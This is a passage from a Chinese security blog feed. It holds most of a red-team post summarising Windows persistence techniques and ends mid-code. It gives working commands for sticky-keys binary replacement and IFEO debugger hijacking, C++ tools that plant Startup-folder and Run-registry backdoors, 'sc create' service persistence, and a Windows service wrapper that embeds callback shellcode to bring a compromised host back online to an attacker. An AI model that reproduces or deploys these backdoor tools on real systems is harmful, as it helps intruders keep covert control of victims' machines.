src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/62.png"></p><p>经过一系列代理操作还是在win7边缘主机访问到win2012核心机器</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/63.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>windows权限维持总结</title>
    <link href="/2021/09/01/windows%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/"/>
    <url>/2021/09/01/windows%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>红队人员拿到一台主机权限后首先会考虑将该机器作为一个持久化的据点，种植一个具备持久化的后门，从而随时可以连接该被控机器进行深入渗透。通俗的说抓到一条鱼,不能轻易放走了。</p><h1 id="0x02-辅助功能镜像劫持"><a href="#0x02-辅助功能镜像劫持" class="headerlink" title="0x02 辅助功能镜像劫持"></a>0x02 辅助功能镜像劫持</h1><p> 为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。</p><p>比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序</p><p>还有:</p><ul><li>屏幕键盘： C:\Windows\System32\osk.exe</li><li>放大镜： C:\Windows\System32\Magnify.exe</li><li>旁白： C:\Windows\System32\Narrator.exe</li><li>显示切换器 C:\Windows\System32\DisplaySwitch.exe</li><li>应用切换器： C:\Windows\System32\AtBroker.exe</li></ul><p>在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将C:\Windows\System32\sethc.exe替换为cmd.exe。</p><h2 id="windows-2003，xp"><a href="#windows-2003，xp" class="headerlink" title="windows 2003，xp"></a>windows 2003，xp</h2><p>可以可视化界面更换也可以命令行:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc.ex c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc1.exe<br>copy c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\s</span>ethc.exe<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/1.png"></p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/2.png"></p><h2 id="更高版本"><a href="#更高版本" class="headerlink" title="更高版本"></a>更高版本</h2><p>我们需要用到IFEO,即映像劫持</p><h3 id="什么是IFEO"><a href="#什么是IFEO" class="headerlink" title="什么是IFEO"></a>什么是IFEO</h3><p>所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</p><p>当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序。</p><h3 id="可视化修改"><a href="#可视化修改" class="headerlink" title="可视化修改"></a>可视化修改</h3><p>在iexplorer.exe中加入键值对:debugger c:\windows\system32\cmd.exe</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/3.png"></p><h3 id="命令行修改"><a href="#命令行修改" class="headerlink" title="命令行修改"></a>命令行修改</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\i</span>explore.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /f<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/4.png"></p><p>当然,需要管理员权限</p><h1 id="0x03-启动项-服务后门"><a href="#0x03-启动项-服务后门" class="headerlink" title="0x03 启动项/服务后门"></a>0x03 启动项/服务后门</h1><h2 id="开始菜单启动项"><a href="#开始菜单启动项" class="headerlink" title="开始菜单启动项"></a>开始菜单启动项</h2><p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\S</span>D<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartup<br></code></pre></td></tr></table></figure><p>相关键值</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\U</span>ser   Shell Folders <br>HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\S</span>hell   Folders <br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\S</span>hell   Folders <br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\E</span>xplorer<span class="hljs-symbol">\U</span>ser   Shell Folders<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/5.png"></p><p> 重启后自启</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/6.png"></p><p>由于每台电脑的快速启动目录不同,可以代码实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>   <span class="hljs-meta-string">&lt;shlobj.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>   comment(lib, <span class="hljs-meta-string">&quot;shell32.lib&quot;</span>)</span><br><br><span class="hljs-function">BOOL <span class="hljs-title">AutoRun_Startup</span><span class="hljs-params">(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName)</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL ret = <span class="hljs-literal">false</span>;<br>    CHAR szStartPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    CHAR szDestFilePath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-comment">//返回快速启动目录路径到szStartPath</span><br>    ret = ::<span class="hljs-built_in">SHGetSpecialFolderPathA</span>(<span class="hljs-literal">NULL</span>, szStartPath,CSIDL_STARTUP,TRUE);<br>    <span class="hljs-comment">//判断是否获取成功</span><br>    <span class="hljs-keyword">if</span> (ret == TRUE)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Get the quick start directory successfully！\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Get the quick start directory faild！\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//构造文件在快速启动目录下的路径</span><br>    ::<span class="hljs-built_in">wsprintfA</span>(szDestFilePath,<span class="hljs-string">&quot;%s\\%s&quot;</span>,szStartPath,lpszDestFileName);<br>    <span class="hljs-comment">//复制文件到快速启动目录下</span><br>    ret = ::<span class="hljs-built_in">CopyFileA</span>(lpszSrcFilePath, szDestFilePath, FALSE);<br>    <span class="hljs-keyword">if</span> (FALSE == ret)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Failed to save the file in the quick start directory.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Successfully to save the file in the quick start directory.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Backdoor generation in quick start directory successful!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Useage:\n    %s %s %s\n&quot;</span>, <span class="hljs-string">&quot;Run_StartUp.exe&quot;</span>, <span class="hljs-string">&quot;E:\\010Editor\\010 Editor\\010Editor.exe&quot;</span>, <span class="hljs-string">&quot;010Editor.exe&quot;</span>);<br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">AutoRun_Startup</span>(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!]Please check the number of your parameters\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/7.png"></p><h2 id="启动项注册表后门"><a href="#启动项注册表后门" class="headerlink" title="启动项注册表后门"></a>启动项注册表后门</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br>HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<br></code></pre></td></tr></table></figure><p>值得注意的是,HKEY_CURRENT_USER的改动不需要管理员权限</p><p>自己写的一个小工具</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/8.png"></p><p>代码不多,也比较简单,还是分享出来：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;iostream&gt;<br>#<span class="hljs-keyword">include</span> &lt;windows.h&gt;<br><br>BOOL <span class="hljs-constructor">Reg_CurrentUser(<span class="hljs-params">const</span> <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">lpszFileName</span>,<span class="hljs-params">const</span> <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">lpszValueName</span>)</span><br>&#123;<br>    <span class="hljs-comment">//定义一个注册表句柄</span><br>    HKEY hKey;<br>    <span class="hljs-comment">//打开注册表键</span><br>    <span class="hljs-keyword">if</span> (ERROR_SUCCESS<span class="hljs-operator"> == </span>::<span class="hljs-constructor">RegOpenKeyEx(HKEY_CURRENT_USER, L<span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, 0, KEY_WRITE, &amp;<span class="hljs-params">hKey</span>)</span>)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;[+] Open RegKey Successfully\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;[!] Open RegKey Error\n&quot;</span>);<br>        return FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ERROR_SUCCESS<span class="hljs-operator"> == </span>::<span class="hljs-constructor">RegSetValueExA(<span class="hljs-params">hKey</span>, <span class="hljs-params">lpszValueName</span>, 0, REG_SZ, (BYTE<span class="hljs-operator">*</span>)</span>lpszFileName, (<span class="hljs-number">1</span> + ::lstrlen<span class="hljs-constructor">A(<span class="hljs-params">lpszFileName</span>)</span>)))<br>    &#123;<br>        printf(<span class="hljs-string">&quot;[+] Set Value Successfully\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        ::<span class="hljs-constructor">RegCloseKey(<span class="hljs-params">hKey</span>)</span>;<br>        printf(<span class="hljs-string">&quot;[!] Set Value Error\n&quot;</span>);<br>        return FALSE;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;[+] The registry backdoor about HKEY_CURRENT_USER is generated successfully\n&quot;</span>);<br>    ::<span class="hljs-constructor">RegCloseKey(<span class="hljs-params">hKey</span>)</span>;<br>    return TRUE;<br>&#125;<br><br><span class="hljs-built_in">int</span> main(<span class="hljs-built_in">int</span> argc, <span class="hljs-built_in">char</span>* argv<span class="hljs-literal">[]</span>)<br>&#123;<br>    printf(<span class="hljs-string">&quot;[*]Useage:\n    %s %s %s\n&quot;</span>,<span class="hljs-string">&quot;ModifyReg.exe&quot;</span>,<span class="hljs-string">&quot;E:\\010Editor\\010 Editor\\010Editor.exe&quot;</span>, <span class="hljs-string">&quot;010Editor&quot;</span>);<br>    <span class="hljs-keyword">if</span> (argc<span class="hljs-operator"> == </span><span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-constructor">Reg_CurrentUser(<span class="hljs-params">argv</span>[1], <span class="hljs-params">argv</span>[2])</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        printf(<span class="hljs-string">&quot;[!]Please check the number of your parameters\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而更改HKEY_LOCAL_MACHINE却是需要管理员权限</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/9.png"></p><p>重启后exe会自启,不一定是cmd程序,可以换成我们自己的马,达到维持权限的效果</p><h3 id="使用命令行"><a href="#使用命令行" class="headerlink" title="使用命令行"></a>使用命令行</h3><p>修改HKLM</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un   /v &quot;123&quot; /t REG_SZ /d &quot;C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot; /f<br></code></pre></td></tr></table></figure><p>同样需要管理员权限,代码跟上面差不多<br><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/10.png"></p><p> HKEY_CURRENT_USER同理,但不需要管理员权限</p><p><img src="/img/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%BB%E7%BB%93/11.png"></p><h2 id="自启动服务后门"><a href="#自启动服务后门" class="headerlink" title="自启动服务后门"></a>自启动服务后门</h2><p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p><p>可以通过如下命令行方式添加一个服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>create <span class="hljs-string">&quot;SD&quot;</span> <span class="hljs-keyword">binpath= </span>  <span class="hljs-string">&quot;C:\Users\SD\Desktop\test.exe&quot;</span> <br><span class="hljs-keyword">sc </span>description <span class="hljs-string">&quot;SD&quot;</span>   <span class="hljs-string">&quot;description&quot;</span> 设置服务的描述字符串 <br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> <span class="hljs-string">&quot;SD&quot;</span>   start= auto  设置这个服务为自动启动 <br>net start <span class="hljs-string">&quot;SD&quot;</span>   启动服务<br></code></pre></td></tr></table></figure><p>也可以直接编写一个服务,穿插着shellcode上线</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =<span class="hljs-string">&quot;\xfc\xe8\x89\x00\x00...............................................\x36\x38\x2e\x31\x2e\x31\x30\x36\x00\x12\x34\x56\x78&quot;</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLEEP_TIME 5000                          <span class="hljs-comment">/*间隔时间*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOGFILE <span class="hljs-meta-string">&quot;C:\\Windows\\log1.txt&quot;</span>              <span class="hljs-comment">/*信息输出文件*/</span></span><br><br>SERVICE_STATUS ServiceStatus;  <span class="hljs-comment">/*服务状态*/</span><br>SERVICE_STATUS_HANDLE hStatus; <span class="hljs-comment">/*服务状态句柄*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>   <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, CHAR* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sddd&quot;</span>);<br>    SERVICE_TABLE_ENTRY ServiceTable[<span class="hljs-number">2</span>];<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceName = WserviceName;<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceName = <span class="hljs-literal">NULL</span>;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceProc = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">StartServiceCtrlDispatcher</span>(ServiceTable);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">WriteToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pfile;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;pfile, LOGFILE, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pfile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf_s</span>(pfile, <span class="hljs-string">&quot;%s\n&quot;</span>, str);<br>    <span class="hljs-built_in">fclose</span>(pfile);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*Service initialization*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    CHAR Message[] = <span class="hljs-string">&quot;Monitoring started.&quot;</span>;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Monitoring started.&quot;</span>));<br>    <span class="hljs-keyword">int</span> result;<br>    result = <span class="hljs-built_in">WriteToLog</span>(Message);<br><br>    <span class="hljs-keyword">return</span>(result);<br>&#125;<br><br><span class="hljs-comment">/*Control Handler*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (request)<br>    &#123;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_STOP:<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_SHUTDOWN:<br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br><br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        